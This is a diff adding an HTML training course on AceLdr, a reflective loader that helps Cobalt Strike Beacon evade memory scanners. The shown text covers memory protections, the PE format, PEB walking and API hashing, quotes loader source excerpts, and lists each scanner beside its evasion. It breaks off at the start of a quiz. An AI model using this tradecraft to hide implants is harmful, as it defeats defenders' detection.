@@ -1,0 +1,1532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AceLdr Deep Dive - Memory Evasion Masterclass</title>
+<style>
+:root{--bg:#0a0e17;--surface:#111827;--surface2:#1a2332;--border:#2a3a4e;--accent:#00d4ff;--accent2:#7c3aed;--green:#10b981;--red:#ef4444;--yellow:#f59e0b;--text:#e2e8f0;--dim:#64748b;--code-bg:#0d1117;--gradient:linear-gradient(135deg,#00d4ff,#7c3aed)}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;line-height:1.7;overflow-x:hidden}
+::selection{background:var(--accent);color:var(--bg)}
+::-webkit-scrollbar{width:8px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
+
+/* NAV */
+nav{position:fixed;top:0;left:0;width:260px;height:100vh;background:var(--surface);border-right:1px solid var(--border);padding:20px 0;overflow-y:auto;z-index:100;transition:transform .3s}
+nav .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:10px}
+nav .logo h2{background:var(--gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:1.3rem}
+nav .logo span{color:var(--dim);font-size:.75rem}
+nav a{display:flex;align-items:center;gap:10px;padding:10px 20px;color:var(--dim);text-decoration:none;font-size:.85rem;transition:all .2s;border-left:3px solid transparent}
+nav a:hover,nav a.active{color:var(--text);background:var(--surface2);border-left-color:var(--accent)}
+nav a .diff{font-size:.65rem;padding:2px 6px;border-radius:3px;font-weight:700}
+nav a .d1{background:#10b98130;color:var(--green)}
+nav a .d2{background:#f59e0b30;color:var(--yellow)}
+nav a .d3{background:#ef444430;color:var(--red)}
+.hamburger{display:none;position:fixed;top:15px;left:15px;z-index:200;background:var(--surface);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:6px;cursor:pointer;font-size:1.2rem}
+
+/* MAIN */
+main{margin-left:260px;padding:40px;max-width:960px}
+.module{display:none;animation:fadeIn .4s}
+.module.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+h1{font-size:2rem;margin-bottom:10px;background:var(--gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+h2{font-size:1.5rem;color:var(--accent);margin:30px 0 15px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+h3{font-size:1.15rem;color:var(--text);margin:20px 0 10px}
+p{margin-bottom:15px;color:#cbd5e1}
+.subtitle{color:var(--dim);font-size:1rem;margin-bottom:30px}
+
+/* BADGES */
+.diff-badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:.75rem;font-weight:700;margin-bottom:20px}
+.diff-badge.easy{background:#10b98130;color:var(--green)}
+.diff-badge.medium{background:#f59e0b30;color:var(--yellow)}
+.diff-badge.hard{background:#ef444430;color:var(--red)}
+
+/* CARDS */
+.card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:25px;margin:20px 0}
+.card.highlight{border-left:4px solid var(--accent)}
+.card.warn{border-left:4px solid var(--yellow);background:#f59e0b08}
+.card.green{border-left:4px solid var(--green)}
+.card h4{margin-bottom:10px;color:var(--accent)}
+.card.warn h4{color:var(--yellow)}
+
+/* CODE */
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:20px;overflow-x:auto;margin:15px 0;font-size:.82rem;line-height:1.6;position:relative}
+pre .lang-tag{position:absolute;top:8px;right:12px;color:var(--dim);font-size:.7rem;text-transform:uppercase}
+code{font-family:'Cascadia Code','Fira Code',monospace}
+p code,.card code,li code{background:var(--code-bg);padding:2px 7px;border-radius:4px;font-size:.85em;color:var(--accent)}
+
+/* DIAGRAM */
+.diagram{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:30px;margin:20px 0;overflow-x:auto}
+.diagram svg{max-width:100%;height:auto}
+.flow{display:flex;align-items:center;flex-wrap:wrap;gap:0;justify-content:center;margin:10px 0}
+.flow .box{background:var(--surface2);border:1px solid var(--border);padding:10px 16px;border-radius:8px;font-size:.8rem;text-align:center;min-width:100px;color:var(--text)}
+.flow .box.hl{border-color:var(--accent);color:var(--accent)}
+.flow .box.g{border-color:var(--green);color:var(--green)}
+.flow .box.r{border-color:var(--red);color:var(--red)}
+.flow .box.y{border-color:var(--yellow);color:var(--yellow)}
+.flow .arrow{color:var(--dim);font-size:1.2rem;padding:0 4px;flex-shrink:0}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;margin:15px 0;font-size:.85rem}
+th{background:var(--surface2);color:var(--accent);padding:12px;text-align:left;border-bottom:2px solid var(--border)}
+td{padding:10px 12px;border-bottom:1px solid var(--border)}
+tr:hover td{background:var(--surface2)}
+
+/* QUIZ */
+.quiz{background:var(--surface);border:2px solid var(--accent2);border-radius:12px;padding:25px;margin:25px 0}
+.quiz h4{color:var(--accent2);margin-bottom:15px;font-size:1.1rem}
+.quiz-q{margin-bottom:20px}
+.quiz-q p{font-weight:600;margin-bottom:10px}
+.quiz-q label{display:block;padding:10px 15px;margin:5px 0;border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .2s;font-size:.9rem}
+.quiz-q label:hover{border-color:var(--accent2);background:var(--surface2)}
+.quiz-q label.correct{border-color:var(--green);background:#10b98115;color:var(--green)}
+.quiz-q label.wrong{border-color:var(--red);background:#ef444415;color:var(--red)}
+.quiz-q .explain{display:none;margin-top:10px;padding:12px;background:var(--surface2);border-radius:8px;font-size:.85rem;border-left:3px solid var(--accent2)}
+.quiz-btn{background:var(--gradient);color:#fff;border:none;padding:10px 30px;border-radius:8px;cursor:pointer;font-weight:700;font-size:.9rem;transition:transform .1s}
+.quiz-btn:hover{transform:scale(1.03)}
+.quiz-result{margin-top:15px;padding:15px;border-radius:8px;font-weight:700;display:none}
+
+/* PROGRESS BAR */
+.progress-wrap{padding:10px 20px;border-bottom:1px solid var(--border)}
+.progress-bar{height:4px;background:var(--surface2);border-radius:2px;overflow:hidden}
+.progress-fill{height:100%;background:var(--gradient);transition:width .4s;border-radius:2px}
+.progress-text{font-size:.7rem;color:var(--dim);margin-top:4px}
+
+/* NAV BUTTONS */
+.nav-btns{display:flex;justify-content:space-between;margin-top:40px;padding-top:20px;border-top:1px solid var(--border)}
+.nav-btns button{background:var(--surface);border:1px solid var(--border);color:var(--text);padding:10px 24px;border-radius:8px;cursor:pointer;font-size:.9rem;transition:all .2s}
+.nav-btns button:hover{border-color:var(--accent);color:var(--accent)}
+.nav-btns button.primary{background:var(--gradient);border:none;color:#fff;font-weight:600}
+
+/* LISTS */
+ul,ol{margin:10px 0 15px 25px}
+li{margin:5px 0;color:#cbd5e1}
+li strong{color:var(--text)}
+
+/* TOOLTIP */
+.tip{position:relative;display:inline-block;border-bottom:1px dashed var(--accent);cursor:help}
+.tip:hover::after{content:attr(data-tip);position:absolute;bottom:120%;left:50%;transform:translateX(-50%);background:var(--surface2);color:var(--text);padding:8px 12px;border-radius:6px;font-size:.78rem;white-space:nowrap;border:1px solid var(--border);z-index:10}
+
+/* RESPONSIVE */
+@media(max-width:800px){
+nav{transform:translateX(-100%)}
+nav.open{transform:translateX(0)}
+.hamburger{display:block}
+main{margin-left:0;padding:20px;padding-top:60px}
+}
+</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav id="sidenav">
+<div class="logo">
+<h2>AceLdr Course</h2>
+<span>Memory Evasion Masterclass</span>
+</div>
+<div class="progress-wrap">
+<div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
+<div class="progress-text" id="progressText">0 / 9 modules</div>
+</div>
+<a href="#" data-mod="0" class="active"><span class="diff d1">1</span> Windows Memory 101</a>
+<a href="#" data-mod="1"><span class="diff d1">2</span> PE File Format</a>
+<a href="#" data-mod="2"><span class="diff d1">3</span> PEB &amp; API Hashing</a>
+<a href="#" data-mod="3"><span class="diff d2">4</span> Reflective Loading</a>
+<a href="#" data-mod="4"><span class="diff d2">5</span> Position-Independent Code</a>
+<a href="#" data-mod="5"><span class="diff d2">6</span> IAT Hooking</a>
+<a href="#" data-mod="6"><span class="diff d3">7</span> Return Addr Spoofing</a>
+<a href="#" data-mod="7"><span class="diff d3">8</span> FOLIAGE Sleep Mask</a>
+<a href="#" data-mod="8"><span class="diff d3">9</span> Full Chain &amp; Integration</a>
+</nav>
+
+<main id="content">
+<!-- ============== MODULE 0 ============== -->
+<div class="module active" id="mod0">
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 1: Windows Memory Fundamentals</h1>
+<p class="subtitle">What happens in RAM stays in RAM... unless a scanner finds it.</p>
+
+<div class="card highlight">
+<h4>Why This Module?</h4>
+<p>Before we reverse-engineer AceLdr, you need a mental model of how Windows manages memory. Every evasion technique in this project is basically a clever trick against these fundamentals. Think of it as learning the rules of chess before learning gambits.</p>
+</div>
+
+<h2>Virtual Memory: Your Private Universe</h2>
+<p>Every Windows process gets its own <strong>virtual address space</strong>. On a 64-bit system, that's a theoretical 128 TB playground. The CPU's <strong>MMU (Memory Management Unit)</strong> translates virtual addresses to physical RAM addresses using <strong>page tables</strong>.</p>
+<p>The smallest unit of memory Windows manages is a <strong>page</strong> (typically 4 KB = 4096 bytes). Each page has <strong>protection flags</strong> that determine what you can do with it:</p>
+
+<table>
+<tr><th>Protection</th><th>Constant</th><th>Hex</th><th>What it means</th></tr>
+<tr><td>Read Only</td><td><code>PAGE_READONLY</code></td><td>0x02</td><td>Can read, but not write or execute</td></tr>
+<tr><td>Read/Write</td><td><code>PAGE_READWRITE</code></td><td>0x04</td><td>Can read + write. Most heap memory.</td></tr>
+<tr><td>Execute/Read</td><td><code>PAGE_EXECUTE_READ</code></td><td>0x20</td><td>Can read + execute code. Normal .text sections.</td></tr>
+<tr><td>Execute/R/W</td><td><code>PAGE_EXECUTE_READWRITE</code></td><td>0x40</td><td>The red flag. Read + write + execute.</td></tr>
+</table>
+
+<div class="card warn">
+<h4>Why Defenders Care About RWX</h4>
+<p>Legitimate programs almost <strong>never</strong> need memory that is both writable AND executable at the same time. When a scanner like <strong>Moneta</strong> finds RWX pages, it's an immediate red flag. AceLdr avoids this by carefully toggling permissions: write when it needs to write, execute when it needs to execute, <strong>never both at once</strong> (except briefly during the sleep chain).</p>
+</div>
+
+<h2>Key Memory APIs</h2>
+<p>Windows provides these functions to manage virtual memory. AceLdr uses the <strong>Nt*</strong> (native) versions because they bypass some userland monitoring:</p>
+
+<pre><code><span class="lang-tag">C</span>// High-level (kernel32)
+LPVOID VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD protect);
+BOOL   VirtualProtect(LPVOID addr, SIZE_T size, DWORD new, PDWORD old);
+
+// Low-level (ntdll) - what AceLdr actually uses
+NTSTATUS NtAllocateVirtualMemory(HANDLE proc, PVOID *base, ULONG_PTR zero,
+                                  PSIZE_T size, ULONG type, ULONG protect);
+NTSTATUS NtProtectVirtualMemory(HANDLE proc, PVOID *base,
+                                 PSIZE_T size, ULONG newprot, PULONG old);</code></pre>
+
+<h2>The Windows Heap</h2>
+<p>The <strong>heap</strong> is where dynamic allocations live (<code>malloc</code>, <code>HeapAlloc</code>, <code>new</code>). Each process has a <strong>default process heap</strong> accessible via <code>GetProcessHeap()</code>. Memory scanners inspect this heap looking for suspicious content.</p>
+<p>AceLdr's trick: it creates a <strong>separate, private heap</strong> via <code>RtlCreateHeap()</code> and redirects Beacon's allocations there. Scanners looking at the default process heap find nothing.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Memory Layout: Normal vs AceLdr</h4>
+<div style="display:flex;gap:30px;justify-content:center;flex-wrap:wrap">
+<div style="flex:1;min-width:250px">
+<p style="text-align:center;color:var(--red);font-weight:700;margin-bottom:10px">Normal Beacon (Detectable)</p>
+<div class="flow" style="flex-direction:column;gap:4px">
+<div class="box r" style="width:100%">Process Default Heap &larr; contains Beacon data</div>
+<div class="box r" style="width:100%">.text section RWX &larr; Beacon code (always executable)</div>
+<div class="box" style="width:100%">Standard Thread Stack</div>
+</div>
+</div>
+<div style="flex:1;min-width:250px">
+<p style="text-align:center;color:var(--green);font-weight:700;margin-bottom:10px">AceLdr Beacon (Evasive)</p>
+<div class="flow" style="flex-direction:column;gap:4px">
+<div class="box g" style="width:100%">Process Default Heap &larr; clean, nothing suspicious</div>
+<div class="box g" style="width:100%">Private Heap (encrypted during sleep)</div>
+<div class="box g" style="width:100%">.text RX (encrypted + non-exec during sleep)</div>
+</div>
+</div>
+</div>
+</div>
+
+<h2>Memory Scanners: The Enemy</h2>
+<p>AceLdr was built to evade <strong>7 specific tools</strong>. Here's what each one looks for:</p>
+<table>
+<tr><th>Scanner</th><th>Detection Method</th><th>AceLdr's Counter</th></tr>
+<tr><td><strong>Moneta</strong></td><td>Finds RWX private memory, unbacked executable regions</td><td>Toggles permissions; memory is RW or RX, never RWX</td></tr>
+<tr><td><strong>PE-sieve</strong></td><td>Scans for PE headers and known signatures in memory</td><td>Encrypts all code during sleep with RC4</td></tr>
+<tr><td><strong>BeaconEye</strong></td><td>Pattern-matches Beacon config in heap memory</td><td>Separate heap + encryption = config invisible</td></tr>
+<tr><td><strong>Hunt-Sleeping-Beacons</strong></td><td>Inspects call stacks of sleeping threads</td><td>Return address spoofing + context manipulation</td></tr>
+<tr><td><strong>BeaconHunter</strong></td><td>Identifies Beacon by memory patterns and behavior</td><td>Full memory encryption + heap redirection</td></tr>
+<tr><td><strong>Patriot</strong></td><td>Walks thread stacks looking for suspicious frames</td><td>JMP RBX trampoline gadget to spoof stack</td></tr>
+<tr><td><strong>MalMemDetect</strong></td><td>Finds malicious artifacts in process memory</td><td>Everything encrypted and hidden during idle</td></tr>
+</table>
+
+<div class="quiz" id="quiz0">
+<h4>Pop Quiz: Memory Fundamentals</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why is PAGE_EXECUTE_READWRITE (RWX) suspicious to memory scanners?</p>
+<label data-opt="0"><input type="radio" name="q0_0"> It's slower than other protections</label>
+<label data-opt="1"><input type="radio" name="q0_0"> It uses more physical RAM</label>
+<label data-opt="2"><input type="radio" name="q0_0"> Legitimate programs rarely need writable + executable memory simultaneously</label>
+<label data-opt="3"><input type="radio" name="q0_0"> Windows doesn't officially support it</label>
+<div class="explain">Correct! Normal compiled code is mapped as RX (execute + read). Data is RW (read + write). Needing both at once strongly suggests runtime code generation or injection - exactly what shellcode does.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: AceLdr creates a private heap. Why?</p>
+<label data-opt="0"><input type="radio" name="q0_1"> For better performance</label>
+<label data-opt="1"><input type="radio" name="q0_1"> To isolate Beacon's data from scanners inspecting the default process heap</label>
+<label data-opt="2"><input type="radio" name="q0_1"> Because the default heap is too small</label>
+<label data-opt="3"><input type="radio" name="q0_1"> To avoid heap corruption bugs</label>
+<div class="explain">AceLdr hooks GetProcessHeap() to return a custom heap created with RtlCreateHeap(). Scanners like BeaconEye that walk the default process heap looking for Beacon config structures won't find anything.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q3: What is the typical page size on Windows x64?</p>
+<label data-opt="0"><input type="radio" name="q0_2"> 4096 bytes (4 KB)</label>
+<label data-opt="1"><input type="radio" name="q0_2"> 8192 bytes (8 KB)</label>
+<label data-opt="2"><input type="radio" name="q0_2"> 1024 bytes (1 KB)</label>
+<label data-opt="3"><input type="radio" name="q0_2"> 65536 bytes (64 KB)</label>
+<div class="explain">Windows uses 4 KB pages by default. The 64 KB value (65536) is the allocation granularity - the minimum size VirtualAlloc will reserve - but actual page granularity is 4 KB.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz0')">Check Answers</button>
+<div class="quiz-result" id="quiz0-result"></div>
+</div>
+
+<div class="nav-btns">
+<span></span>
+<button class="primary" onclick="goTo(1)">Next: PE File Format &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 1 ============== -->
+<div class="module" id="mod1">
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 2: The PE File Format</h1>
+<p class="subtitle">Every .exe and .dll is a PE. AceLdr manually parses one in memory.</p>
+
+<div class="card highlight">
+<h4>The Big Picture</h4>
+<p>A <strong>Portable Executable (PE)</strong> is the file format for Windows executables, DLLs, and drivers. When AceLdr "reflectively loads" Beacon, it's manually doing what the Windows loader (<code>ntdll!LdrLoadDll</code>) normally does: parsing the PE, mapping sections, resolving imports, and applying relocations. Understanding the PE format is <strong>mandatory</strong>.</p>
+</div>
+
+<h2>PE Structure Overview</h2>
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">PE File Layout</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:500px;margin:0 auto">
+<div class="box hl" style="width:100%">DOS Header (IMAGE_DOS_HEADER) - starts with "MZ"</div>
+<div class="box" style="width:100%">DOS Stub (legacy, usually "This program cannot be run in DOS mode")</div>
+<div class="box hl" style="width:100%">NT Headers (IMAGE_NT_HEADERS) - starts with "PE\0\0"</div>
+<div class="box" style="width:100%;font-size:.75rem">&#x251C; Signature<br>&#x251C; FileHeader (machine, number of sections, timestamp)<br>&#x2514; OptionalHeader (entry point, image base, data directories)</div>
+<div class="box y" style="width:100%">Section Headers[] - .text, .rdata, .data, .reloc, etc.</div>
+<div class="box g" style="width:100%">Section Data (actual code and data)</div>
+</div>
+</div>
+
+<h2>Key Structures in AceLdr</h2>
+<p>AceLdr's <code>ace.c</code> directly accesses these PE structures:</p>
+
+<pre><code><span class="lang-tag">C - from ace.c calculateRegions()</span>// The DOS header is the first thing in any PE
+pReg->Dos = C_PTR( G_END() );   // Points to start of Beacon PE
+
+// e_lfanew tells us where NT headers begin (offset from DOS header)
+pReg->NT  = C_PTR( U_PTR( pReg->Dos ) + pReg->Dos->e_lfanew );
+
+// SizeOfImage = total virtual size needed when mapped into memory
+ILn = ( ( ( pReg->NT->OptionalHeader.SizeOfImage ) + 0x1000 - 1 )
+        &~( 0x1000 - 1 ) );  // Round up to page boundary</code></pre>
+
+<h2>Sections: Where Code and Data Live</h2>
+<p>A PE is divided into <strong>sections</strong>. Each has a name, virtual address, raw data offset, and characteristics (permissions):</p>
+
+<table>
+<tr><th>Section</th><th>Contains</th><th>Typical Protection</th></tr>
+<tr><td><code>.text</code></td><td>Executable code</td><td>RX (Read + Execute)</td></tr>
+<tr><td><code>.rdata</code></td><td>Read-only data, import tables, strings</td><td>R (Read Only)</td></tr>
+<tr><td><code>.data</code></td><td>Global/static initialized variables</td><td>RW (Read + Write)</td></tr>
+<tr><td><code>.reloc</code></td><td>Base relocation table</td><td>R (Read Only)</td></tr>
+</table>
+
+<h3>How AceLdr Copies Sections</h3>
+<pre><code><span class="lang-tag">C - from ace.c copyBeaconSections()</span>// Map = destination base address (after our stub)
+Map = C_PTR( U_PTR( buffer ) + reg.Exec );
+
+// Get pointer to first section header
+Sec = IMAGE_FIRST_SECTION( reg.NT );
+
+// Copy each section to its virtual address
+for( int i = 0; i < reg.NT->FileHeader.NumberOfSections; ++i )
+{
+    Destination = C_PTR( U_PTR( Map ) + Sec[i].VirtualAddress );
+    Source      = C_PTR( U_PTR( reg.Dos ) + Sec[i].PointerToRawData );
+    Length      = Sec[i].SizeOfRawData;
+    memcpy( Destination, Source, Length );
+}</code></pre>
+
+<h2>The Import Address Table (IAT)</h2>
+<p>When a PE calls <code>Sleep()</code> or <code>HeapAlloc()</code>, it doesn't know the addresses at compile time. Instead, it uses the <strong>IAT</strong> - a table of function pointers filled in at load time. AceLdr fills this table manually via <code>LdrProcessIat()</code> and then <strong>overwrites specific entries with hooks</strong>.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">IAT Hook Flow</h4>
+<div class="flow">
+<div class="box">Beacon calls<br><code>Sleep()</code></div>
+<div class="arrow">&rarr;</div>
+<div class="box y">IAT Entry<br>(overwritten)</div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">AceLdr's<br><code>Sleep_Hook()</code></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Encrypt + APC<br>chain sleep</div>
+</div>
+</div>
+
+<h2>Base Relocations</h2>
+<p>A PE is compiled with a <strong>preferred base address</strong> (<code>OptionalHeader.ImageBase</code>). If it gets loaded at a different address (which AceLdr guarantees), all absolute addresses in the code are wrong. <strong>Relocations</strong> fix this by adding the delta between the preferred and actual base:</p>
+
+<pre><code><span class="lang-tag">C - from util.c LdrProcessRel()</span>// Calculate offset between actual and preferred address
+Ofs = U_PTR( U_PTR( image ) - U_PTR( imageBase ) );
+
+while ( Ibr->VirtualAddress != 0 ) {
+    Rel = ( PIMAGE_RELOC )( Ibr + 1 );
+    while ( C_PTR( Rel ) != C_PTR( U_PTR( Ibr ) + Ibr->SizeOfBlock ) )
+    {
+        switch( Rel->Type ) {
+            case IMAGE_REL_BASED_DIR64:  // 64-bit absolute fixup
+                *( DWORD64 * )( U_PTR( image ) + Ibr->VirtualAddress
+                    + Rel->Offset ) += ( DWORD64 )( Ofs );
+                break;
+            case IMAGE_REL_BASED_HIGHLOW: // 32-bit absolute fixup
+                *( DWORD32 * )( U_PTR( image ) + Ibr->VirtualAddress
+                    + Rel->Offset ) += ( DWORD32 )( Ofs );
+                break;
+        }
+        ++Rel;
+    }
+    Ibr = C_PTR( Rel );
+}</code></pre>
+
+<div class="quiz" id="quiz1">
+<h4>Pop Quiz: PE Format</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: What does <code>e_lfanew</code> in the DOS header point to?</p>
+<label data-opt="0"><input type="radio" name="q1_0"> The entry point of the program</label>
+<label data-opt="1"><input type="radio" name="q1_0"> The first section header</label>
+<label data-opt="2"><input type="radio" name="q1_0"> The NT Headers (IMAGE_NT_HEADERS)</label>
+<label data-opt="3"><input type="radio" name="q1_0"> The import table</label>
+<div class="explain">e_lfanew is an offset from the start of the DOS header to the PE signature and NT headers. It's the bridge from the legacy DOS header to the modern PE structure.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: Why does AceLdr need to process base relocations?</p>
+<label data-opt="0"><input type="radio" name="q1_1"> To compress the PE file</label>
+<label data-opt="1"><input type="radio" name="q1_1"> Because Beacon is loaded at a different address than its preferred ImageBase</label>
+<label data-opt="2"><input type="radio" name="q1_1"> To hide the PE header from scanners</label>
+<label data-opt="3"><input type="radio" name="q1_1"> Relocations are always required by Windows</label>
+<div class="explain">When a PE is loaded at a different base address than it was compiled for, absolute addresses in the code are wrong. Relocations patch these addresses by adding the delta. AceLdr uses NtAllocateVirtualMemory which gives an arbitrary address, so relocations are essential.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q3: What does AceLdr do to the IAT after populating it normally?</p>
+<label data-opt="0"><input type="radio" name="q1_2"> Encrypts all entries</label>
+<label data-opt="1"><input type="radio" name="q1_2"> Deletes it to save memory</label>
+<label data-opt="2"><input type="radio" name="q1_2"> Nothing, it leaves it as-is</label>
+<label data-opt="3"><input type="radio" name="q1_2"> Overwrites specific entries with hook function pointers</label>
+<div class="explain">After LdrProcessIat() fills in all the normal function pointers, installHooks() uses LdrHookImport() to replace specific entries (Sleep, GetProcessHeap, HeapAlloc, InternetConnectA, NtWaitForSingleObject, RtlAllocateHeap) with AceLdr's custom hook functions.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz1')">Check Answers</button>
+<div class="quiz-result" id="quiz1-result"></div>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(0)">&larr; Previous</button>
+<button class="primary" onclick="goTo(2)">Next: PEB &amp; API Hashing &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 2 ============== -->
+<div class="module" id="mod2">
+<span class="diff-badge easy">Difficulty: Beginner</span>
+<h1>Module 3: PEB Walking &amp; API Hashing</h1>
+<p class="subtitle">How to find any Windows API without a single suspicious import.</p>
+
+<div class="card highlight">
+<h4>The Problem</h4>
+<p>Normal programs <code>#include &lt;windows.h&gt;</code> and call functions directly. The linker adds them to the import table, and anyone running <code>strings</code> on the binary can see exactly what APIs it uses. A binary importing <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code>, and <code>NtQueueApcThread</code> screams "shellcode loader." AceLdr imports <strong>zero</strong> functions. It finds everything at runtime.</p>
+</div>
+
+<h2>The PEB: Your Window Into the Process</h2>
+<p>Every Windows thread has a <strong>TEB (Thread Environment Block)</strong>. The TEB contains a pointer to the <strong>PEB (Process Environment Block)</strong>. The PEB contains, among other things, a linked list of all loaded DLLs. AceLdr walks this list to find modules like <code>ntdll.dll</code>.</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">PEB Module Discovery Chain</h4>
+<div class="flow">
+<div class="box hl">TEB<br><small>(gs:[0x60] on x64)</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">PEB</div>
+<div class="arrow">&rarr;</div>
+<div class="box y">PEB_LDR_DATA</div>
+<div class="arrow">&rarr;</div>
+<div class="box g">InLoadOrderModuleList<br><small>(linked list of LDR_DATA_TABLE_ENTRY)</small></div>
+</div>
+</div>
+
+<pre><code><span class="lang-tag">C - from util.c FindModule()</span>PVOID FindModule( ULONG hash, PPEB peb, PULONG size )
+{
+    PLIST_ENTRY             Hdr = NULL;
+    PLIST_ENTRY             Ent = NULL;
+    PLDR_DATA_TABLE_ENTRY   Ldr = NULL;
+
+    // Get head of the doubly-linked list
+    Hdr = &amp; peb->Ldr->InLoadOrderModuleList;
+    Ent = Hdr->Flink;  // First entry
+
+    // Walk the list until we wrap around to the head
+    for( ; Hdr != Ent; Ent = Ent->Flink )
+    {
+        Ldr = C_PTR( Ent );
+        // Compare hash of this module's name to our target hash
+        if( HashString( Ldr->BaseDllName.Buffer,
+                        Ldr->BaseDllName.Length ) == hash )
+        {
+            if( size != NULL )
+                *size = Ldr->SizeOfImage;
+            return Ldr->DllBase;  // Return base address of the DLL
+        }
+    }
+    return NULL;
+}</code></pre>
+
+<h2>DJB2 Hashing: Names Without Strings</h2>
+<p>Instead of storing the string <code>"NtAllocateVirtualMemory"</code> (which defenders can search for), AceLdr stores its <strong>DJB2 hash</strong>: <code>0xf783b8ec</code>. At runtime, it hashes every export name until it finds a match.</p>
+
+<pre><code><span class="lang-tag">C - from util.c HashString()</span>UINT32 HashString( PVOID buffer, ULONG size )
+{
+    UCHAR  Cur = 0;
+    ULONG  Djb = 5381;   // DJB2 magic starting value
+    PUCHAR Ptr = buffer;
+
+    while ( TRUE )
+    {
+        Cur = *Ptr;
+        if( !size ) { if( !*Ptr ) break; }
+        else { if( (ULONG)(Ptr - (PUCHAR)buffer) >= size ) break; }
+
+        if( Cur >= 'a' ) Cur -= 0x20;  // Case-insensitive
+
+        Djb = (( Djb << 5 ) + Djb ) + Cur;  // hash * 33 + char
+        ++Ptr;
+    }
+    return Djb;
+}</code></pre>
+
+<pre><code><span class="lang-tag">Python - scripts/hashstring.py</span>#!/usr/bin/env python3
+# The same algorithm in Python - used to pre-compute hashes
+def hash_string( string ):
+    hash = 5381
+    for x in string.upper():
+        hash = (( hash &lt;&lt; 5 ) + hash ) + ord(x)
+    return hash &amp; 0xFFFFFFFF
+
+# Example: python hashstring.py "NtAllocateVirtualMemory"
+# Output:  0xf783b8ec</code></pre>
+
+<h2>Finding Exported Functions</h2>
+<p>Once we have a module's base address, we walk its <strong>export table</strong> to find specific functions:</p>
+
+<pre><code><span class="lang-tag">C - from util.c FindFunction()</span>PVOID FindFunction( PVOID image, ULONG hash )
+{
+    // Navigate PE headers to the export directory
+    Hdr = image;
+    Nth = image + Hdr->e_lfanew;
+    Dir = &amp;Nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    Exp = image + Dir->VirtualAddress;
+
+    // Three parallel arrays: names, functions, ordinals
+    Aon = image + Exp->AddressOfNames;
+    Aof = image + Exp->AddressOfFunctions;
+    Aoo = image + Exp->AddressOfNameOrdinals;
+
+    for( Idx = 0; Idx < Exp->NumberOfNames; ++Idx )
+    {
+        // Hash each export name, compare to our target
+        if( HashString( image + Aon[Idx], 0 ) == hash )
+            return image + Aof[ Aoo[Idx] ];  // Found it!
+    }
+    return NULL;
+}</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Complete API Resolution Chain</h4>
+<div class="flow">
+<div class="box">TEB</div>
+<div class="arrow">&rarr;</div>
+<div class="box">PEB</div>
+<div class="arrow">&rarr;</div>
+<div class="box y">Walk module list<br>(FindModule)</div>
+<div class="arrow">&rarr;</div>
+<div class="box y">Walk export table<br>(FindFunction)</div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Function pointer<br>ready to call!</div>
+</div>
+</div>
+
+<h3>AceLdr's Hash Constants</h3>
+<p>These are pre-computed in <code>include.h</code> and matched at runtime:</p>
+<pre><code><span class="lang-tag">C - from include.h (selected hashes)</span>#define H_LIB_NTDLL                  0x1edab0ed  // "ntdll.dll"
+#define H_LIB_KERNEL32               0x6ddb9555  // "kernel32.dll"
+#define H_API_NTALLOCATEVIRTUALMEMORY 0xf783b8ec
+#define H_API_NTPROTECTVIRTUALMEMORY  0x50e92888
+#define H_API_RTLCREATEHEAP           0xe1af6849
+#define H_API_SLEEP                   0x0e07cd7e
+#define H_API_GETPROCESSHEAP          0x36c007a2
+// ... 50+ more hashes</code></pre>
+
+<div class="quiz" id="quiz2">
+<h4>Pop Quiz: PEB &amp; Hashing</h4>
+<div class="quiz-q" data-correct="2">
